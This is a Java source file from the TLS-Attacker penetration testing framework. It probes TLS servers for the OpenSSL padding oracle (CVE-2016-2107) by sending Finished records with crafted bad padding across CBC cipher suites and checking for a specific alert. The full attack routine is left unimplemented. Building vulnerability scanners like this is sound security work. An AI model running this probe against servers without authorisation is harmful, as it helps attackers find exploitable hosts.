/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.Cve20162107CommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.VariableModification;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.constants.AlertDescription;
import de.rub.nds.tlsattacker.tls.constants.AlertLevel;
import de.rub.nds.tlsattacker.tls.constants.CipherSuite;
import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.tls.protocol.message.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.tls.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.record.Record;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsConfig;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.tls.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.tls.workflow.action.SendAction;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Tests for the availability of the OpenSSL padding oracle (CVE-2016-2107).
 *
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class Cve20162107Attacker extends Attacker<Cve20162107CommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(Cve20162107Attacker.class);

    private final List<ProtocolMessage> lastMessages;

    private boolean vulnerable;

    public Cve20162107Attacker(Cve20162107CommandConfig config) {
        super(config, false);
        lastMessages = new LinkedList<>();
    }

    @Override
    public void executeAttack() {
        throw new UnsupportedOperationException("Not implemented yet");
    }

    private Boolean executeAttackRound(ProtocolVersion version, CipherSuite suite) {
        TlsConfig tlsConfig = config.createConfig();
        List<CipherSuite> suiteList = new LinkedList<>();
        suiteList.add(suite);
        tlsConfig.setSupportedCiphersuites(suiteList);
        tlsConfig.setEnforceSettings(true);
        tlsConfig.setHighestProtocolVersion(version);
        LOGGER.info("Testing {}, {}", version.name(), suite.name());

        TlsContext tlsContext = new TlsContext(tlsConfig);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(),
                tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();
        SendAction sendAction = trace.getFirstConfiguredSendActionWithType(HandshakeMessageType.FINISHED);
        // We need two Records, one for the CCS message and one with finished
        // message with the modified padding
        List<Record> records = new LinkedList<>();
        Record record = createRecordWithBadPadding();
        records.add(new Record());
        records.add(record);
        sendAction.setConfiguredRecords(records);

        // Remove last two server messages (CCS and Finished). Instead of them,
        // an alert will be sent.
        AlertMessage alertMessage = new AlertMessage(tlsConfig);

        ReceiveAction action = (ReceiveAction) (trace.getLastMessageAction());
        List<ProtocolMessage> messages = new LinkedList<>();
        messages.add(alertMessage);
        action.setConfiguredMessages(messages);
        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.warn("Not possible to finalize the defined workflow: {}", ex.getLocalizedMessage());
        }
        // The Server has to answer to our ClientHello with a ServerHello
        // Message, else he does not support
        // the offered Ciphersuite and protocol version
        if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.SERVER_HELLO).isEmpty()) {
            return false;
        }
        ProtocolMessage lm = trace.getAllActuallyReceivedMessages().get(
                trace.getAllActuallyReceivedMessages().size() - 1);
        lastMessages.add(lm);
        if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT) {
            AlertMessage am = ((AlertMessage) lm);
            LOGGER.info("  Last protocol message: Alert ({},{}) [{},{}]", AlertLevel.getAlertLevel(am.getLevel()
                    .getValue()), AlertDescription.getAlertDescription(am.getDescription().getValue()), am.getLevel()
                    .getValue(), am.getDescription().getValue());
        } else {
            LOGGER.info("  Last protocol message: {}", lm.getProtocolMessageType());
        }

        if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT
                && ((AlertMessage) lm).getDescription().getValue() == 22) {
            LOGGER.info("  Vulnerable");
            return true;
        } else {
            LOGGER.info("  Not Vulnerable / Not supported");
            return false;
        }
    }

    private Record createRecordWithBadPadding() {
        byte[] plain = new byte[] { (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255 };
        Record r = new Record();
        ModifiableByteArray plainData = new ModifiableByteArray();
        VariableModification<byte[]> modifier = ByteArrayModificationFactory.explicitValue(plain);
        plainData.setModification(modifier);
        r.setPlainRecordBytes(plainData);
        return r;
    }

    @Override
    public Boolean isVulnerable() {
        List<ProtocolVersion> versions = config.getVersions();
        TlsConfig tlsConfig = config.createConfig();
        List<CipherSuite> ciphers = new LinkedList<>();
        if (tlsConfig.getSupportedCiphersuites().isEmpty()) {
            for (CipherSuite cs : CipherSuite.getImplemented()) {
                if (cs.isCBC()) {
                    ciphers.add(cs);
                }
            }
        } else {
            ciphers = tlsConfig.getSupportedCiphersuites();
        }

        for (ProtocolVersion version : versions) {
            for (CipherSuite suite : ciphers) {
                try {
                    vulnerable |= executeAttackRound(version, suite);
                } catch (Throwable t) {
                    LOGGER.warn("Problem while testing " + version.name() + " with Ciphersuite " + suite.name(), t);
                }
            }
        }

        if (vulnerable) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "VULNERABLE");
        } else {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "NOT VULNERABLE");
        }

        LOGGER.debug("All the attack runs executed. The following messages arrived at the ends of the connections");
        for (ProtocolMessage pm : lastMessages) {
            LOGGER.debug("----- NEXT TLS CONNECTION WITH MODIFIED APPLICATION DATA RECORD -----");
            LOGGER.debug("Last protocol message in the protocol flow");
            LOGGER.debug(pm.toString());
        }
        return vulnerable;
    }
}
